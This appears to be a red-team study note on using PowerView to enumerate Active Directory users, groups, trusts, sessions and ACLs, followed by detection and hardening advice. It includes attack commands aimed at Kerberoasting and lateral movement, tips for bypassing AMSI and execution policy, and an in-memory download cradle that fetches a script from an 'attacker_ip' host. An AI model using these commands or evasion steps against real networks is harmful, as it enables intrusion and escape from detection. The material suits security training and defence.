# 67.02 Using PowerView for AD Enumeration

## 1. Introduction to PowerView

PowerView is a sophisticated PowerShell tool designed to gain deep situational awareness within Active Directory environments. Originally authored by Will Schroeder (harmj0y) as a core component of the PowerSploit framework, it remains arguably the most essential manual enumeration tool for AD penetration testing and red teaming.

While tools like BloodHound are designed to ingest the entire directory to map attack paths graphically, PowerView allows for surgical, highly targeted LDAP and Active Directory Services Interfaces (ADSI) queries. This precision is crucial for maintaining stealth and avoiding the massive noise signature associated with full directory ingestors.

### 1.1 Why PowerView is Essential
- **Zero External Dependencies**: It does not require the Microsoft ActiveDirectory PowerShell module (RSAT) to be installed on the target machine.
- **Living off the Land (LotL)**: It leverages native `.NET` classes and `ADSI` wrappers inherently available on modern Windows operating systems.
- **Surgical Precision**: Operators can query exact attributes or specific objects without triggering mass-enumeration alerts.
- **Deep AD Insight**: It excels at enumerating complex configurations such as Domain Trusts, Group Policy Objects (GPOs), Access Control Lists (ACLs), and Kerberos delegation settings.

## 2. Architecture and Mechanics

PowerView's stealth and efficacy stem from how it interacts with the underlying operating system and network.

```text
+-----------------------+                            +-------------------------+
|                       |                            |                         |
|   Attacker / Client   |                            |    Domain Controller    |
|   (PowerShell Host)   |                            |    (LDAP/Global Cat)    |
|                       |                            |                         |
|  +-----------------+  |   ADSI / .NET Classes    |   +-----------------+   |
|  |                 |  |   LDAP:// / GC://      |   |                 |   |
|  |   PowerView.ps1 +------------------------------->   Active          |   |
|  |                 |  |   Port 389/636/3268    |   |   Directory     |   |
|  +--------+--------+  |                        |   |   Database      |   |
|           |           |   RPC / SMB (Port 445) |   |   (NTDS.dit)    |   |
|  +--------v--------+  |   (For session enum)   |   +-----------------+   |
|  | Console Output/ |  +--------------------------->|                         |
|  | Pipeline Objects|  |                            |                         |
|  +-----------------+  |                            +-------------------------+
+-----------------------+
```

### 2.1 Under the Hood
Instead of relying on custom network protocols, PowerView primarily functions by instantiating `DirectoryEntry` and `DirectorySearcher` .NET objects. When an operator runs a PowerView cmdlet, the script crafts highly specific LDAP filters, sends the query to the Domain Controller via native APIs, and parses the returned properties into clean, manipulatable PowerShell objects. 

This approach means the traffic generated by PowerView looks identical to legitimate AD queries generated by normal Windows services or applications.

## 3. Core PowerView Functions and Usage Scenarios

PowerView contains dozens of functions. Mastery requires understanding which functions to use at different stages of an engagement.

### 3.1 Domain and Trust Enumeration
Understanding the overarching forest and domain structure is the first step in mapping the environment.
- `Get-NetDomain`: Retrieves comprehensive information about the current domain (Name, Domain Controllers, Forest, Domain SID, etc.).
- `Get-NetForest`: Retrieves information about the overarching forest structure.
- `Get-NetDomainTrust`: Enumerates trust relationships. This is critical for lateral movement between different domains.
- `Get-NetForestTrust`: Enumerates forest-level trusts.

```powershell
# Get all trusts for the current domain to identify lateral movement targets
Get-NetDomainTrust

# Investigate trusts for a remote, newly discovered child domain
Get-NetDomainTrust -Domain "child.target.local"

# Get the Domain SID (useful for Golden Ticket creation later)
(Get-NetDomain).DomainSID
```

### 3.2 User and Group Enumeration
Locating privileged accounts and understanding group hierarchies is the bread and butter of AD enumeration.
- `Get-NetUser`: Enumerates user objects and their specific properties.
- `Get-NetGroup`: Enumerates group objects.
- `Get-NetGroupMember`: Lists the members of a specific group, resolving SIDs to names.

```powershell
# Retrieve a specific user and all their attributes
Get-NetUser -SamAccountName "jsmith"

# Find all users with Service Principal Names (SPNs) set (Prime Kerberoasting targets)
Get-NetUser -SPN

# Find all highly privileged groups containing the keyword "Admin"
Get-NetGroup "*Admin*"

# Enumerate all members of the critical "Domain Admins" group
Get-NetGroupMember -GroupName "Domain Admins"
```

### 3.3 Computer and Session Enumeration
Identifying physical/virtual targets for lateral movement and discovering where high-value users are actively logged in.
- `Get-NetComputer`: Enumerates computer objects within the domain.
- `Get-NetSession`: Enumerates active user sessions on a target machine. (Note: Typically requires local admin on the target machine).
- `Find-LocalAdminAccess`: Scans the network to identify machines where the current user context holds local administrator rights.

```powershell
# Find all active Windows Server machines to target infrastructure
Get-NetComputer -OperatingSystem "*Server*" -Ping

# Check where the current user is a local admin (WARNING: Noisy, queries all PCs)
Find-LocalAdminAccess

# Find active sessions on a high-value file server to hijack
Get-NetSession -ComputerName "fs01.target.local"
```

### 3.4 Advanced ACLs and Delegation Enumeration
Active Directory permissions are governed by Access Control Lists (ACLs). Misconfigured ACLs are a primary vector for privilege escalation.
- `Get-ObjectAcl`: Returns the ACLs associated with a specific AD object.
- `Invoke-ACLScanner`: Automatically scans the domain for interesting, abusable ACLs configured for non-administrative users.
- `Get-NetUser -AllowDelegation`: Finds users configured for Unconstrained Delegation.
- `Get-NetUser -TrustedToAuth`: Finds users configured for Constrained Delegation.

```powershell
# Get ACLs applied to the Domain Admins group to see who can modify it
Get-ObjectAcl -SamAccountName "Domain Admins" -ResolveGUIDs

# Find interesting permissions over a specific target user
Get-ObjectAcl -TargetSAMAccountName "target_user" -ResolveGUIDs | Where-Object { $_.ActiveDirectoryRights -match "WriteProperty|GenericAll|GenericWrite|WriteDacl" }

# Run a full scan for abusable ACLs across the domain
Invoke-ACLScanner -ResolveGUIDs
```

## 4. OPSEC: Bypassing Restrictions and Evading Detection

### 4.1 Execution Policy and AMSI
PowerView is highly recognized by defensive systems. Dropping `PowerView.ps1` to disk will immediately trigger Windows Defender.
- **Execution Policy**: Before running scripts, you must bypass the execution policy (e.g., `powershell.exe -ExecutionPolicy Bypass`).
- **AMSI (Antimalware Scan Interface)**: PowerView's strings are heavily signatured by AMSI. If you attempt to load it, it will be blocked. Operators must execute an AMSI bypass in memory *before* loading PowerView.
- **In-Memory Loading**: Never write PowerView to disk. Load it directly into memory via a download cradle or a Command and Control (C2) framework feature.
  ```powershell
  # Example of in-memory loading (Requires AMSI bypass first)
  IEX (New-Object Net.WebClient).DownloadString('http://attacker_ip/powerview.ps1')
  ```

### 4.2 Network Footprint Management
Unlike BloodHound, PowerView is driven manually by the operator, allowing for precise control over the network footprint.
- **Targeted vs. Mass Queries**: Executing `Get-NetUser jsmith` generates a single LDAP query, virtually indistinguishable from normal traffic. Conversely, running `Find-LocalAdminAccess` triggers thousands of RPC/SMB connections across the subnet, immediately alerting Intrusion Detection Systems (IDS) and EDR solutions to lateral movement reconnaissance.
- **Sleep and Jitter**: When writing custom loops using PowerView functions, always implement `Start-Sleep` to blend in with normal administrative cadence.

## 5. Defensive Perspectives and Detection Strategies

### 5.1 Analyzing PowerView Telemetry
Defenders can identify PowerView usage through several logging mechanisms:
1. **Script Block Logging (Event ID 4104)**: If PowerShell Script Block Logging is enabled, the full content of the executed scripts, including the de-obfuscated PowerView code and the specific functions called, will be recorded. This is the most reliable detection method.
2. **Module Logging (Event ID 4103)**: Logs pipeline execution details and variable values as PowerView processes data.
3. **LDAP Monitoring**: Detecting anomalous LDAP queries. For instance, a standard user account suddenly issuing LDAP queries for all objects with SPNs (`servicePrincipalName=*`) or querying thousands of ACLs is highly suspicious.
4. **Network Traffic Analysis**: High volumes of RPC traffic targeting port 445 on numerous hosts (indicative of `SAMR` and `NetSessionEnum` patterns used by PowerView's session hunting features).

### 5.2 Hardening AD against PowerView Enumeration
While you cannot completely stop a user from querying LDAP (as it breaks AD functionality), you can limit the exposure:
- **Hide Privileged Objects**: Utilize the `List Object` mode in AD or explicitly deny `Read` permissions to specific, highly sensitive Organizational Units for standard users.
- **Restrict SAMR**: Deploy Group Policy Objects to restrict remote SAM querying to administrators only, rendering `Find-LocalAdminAccess` and local group enumeration useless for standard users.
- **Monitor Delegation**: Closely audit and monitor accounts configured for any form of delegation, as these are prime targets for enumeration and abuse.

## Real-World Attack Scenario

During a stealthy red team engagement where loud tools like BloodHound are heavily monitored, an attacker relies on PowerView loaded dynamically into memory via an AMSI bypass to avoid dropping files to disk. They surgicaly execute `Get-NetUser -SPN` to identify service accounts and `Get-NetGroupMember` to map nested administrative groups. Discovering a vulnerable backup service account with an SPN, the attacker requests its TGS ticket and cracks it offline (Kerberoasting). Using PowerView's `Get-NetComputer -OperatingSystem "*Server*"` command, they identify a vulnerable backend server to laterally move to using the newly cracked service account credentials, completely evading EDR telemetry that would normally detect mass-enumeration sweeps.

## Chaining Opportunities
- Use `Get-NetUser -SPN` to identify targets. Proceed to request service tickets for **Kerberoasting**.
- Use `Get-NetDomainTrust` to find trust paths. If a two-way forest trust exists, look into SID History attacks or cross-forest kerberoasting.
- Output from PowerView can be cross-referenced with data from [[01 - Introduction to BloodHound and SharpHound]] to validate complex attack paths.
- You can perform similar LDAP lookups using alternative tools if PowerShell is tightly locked down. See [[05 - Enumerating Users and Groups via LDAP]].

## Advanced Threat Hunting and Behavioral Analytics

As evasion techniques evolve, reliance on static indicators of compromise (IoCs) is insufficient. Defenders must pivot to behavioral analytics.

### Baseline Deviation Analysis
Instead of hunting for specific tool signatures (like `SharpHound.exe` or `PowerView.ps1`), mature SOCs establish baselines of administrative behavior.
1. **Administrative Logon Baselines**: Identify the standard jump boxes and IP ranges used by authorized administrators. Any high-privileged authentication originating from a non-standard workstation (e.g., a receptionist's PC) triggers an immediate severity-high alert, regardless of the tool used.
2. **Protocol Baselines**: Standard users rarely, if ever, initiate raw RPC or WMI connections to other workstations. Detecting a high volume of lateral SMB/RPC traffic originating from a standard subnet is a strong behavioral indicator of enumeration or lateral movement.

### Leveraging Graph Databases for Defense
Defenders can utilize the exact same graph theory concepts employed by attackers to secure the environment proactively.
- **Continuous Ingestion**: By scheduling daily or weekly automated ingestions of AD data into a defensive Neo4j database, defenders can track changes over time.
- **Chokepoint Identification**: Graph analysis reveals "chokepoints"—specific users or groups that serve as critical bridges in numerous attack paths. Removing privileges from these chokepoint accounts fractures the attack graph, significantly increasing the effort required by an attacker.
- **Unintended Permission Auditing**: Graph databases easily highlight misconfigurations such as standard users accidentally granted `GenericAll` rights over critical infrastructure OUs due to complex, nested group memberships.

### Conclusion
Active Directory enumeration is a delicate balance of noise versus insight. Attackers must constantly adapt to increasingly sophisticated telemetry and detection mechanisms. For defenders, understanding the mechanics of these enumeration tools is paramount. Security is no longer just about preventing the initial compromise; it is about anticipating the attacker's post-exploitation reconnaissance and disrupting their ability to discover the pathways to domain dominance.

### Real-World Incident Response Scenarios
When responding to suspected AD enumeration:
1. **Isolate Suspect Endpoints**: Immediately quarantine the endpoint initiating the anomalous LDAP or RPC queries.
2. **Review TGT Requests**: Correlate the endpoint activity with Event ID 4768 (A Kerberos authentication ticket (TGT) was requested) to identify the compromised account.
3. **Analyze BloodHound Execution**: If SharpHound is suspected, search for Event ID 4688 containing command-line arguments like `--CollectionMethod` or `--Loop`.
4. **Implement Tiered Administration**: If widespread enumeration is detected, immediately restrict Tier-0 accounts from authenticating to lower-tier systems to break potential `HasSession` escalation paths.

## Glossary of Advanced Terms
- **TGT (Ticket Granting Ticket)**: The primary Kerberos ticket used to request access to other services.
- **SPN (Service Principal Name)**: A unique identifier for a service instance, used in Kerberos authentication.
- **ACL (Access Control List)**: A list of permissions attached to an object.
- **DCSync**: An attack technique simulating a Domain Controller to request password hashes via the Directory Replication Service (DRS) Remote Protocol.
- **Pass-the-Hash (PtH)**: Authenticating to a remote system using the underlying NTLM hash of a user's password, rather than the plaintext password itself.
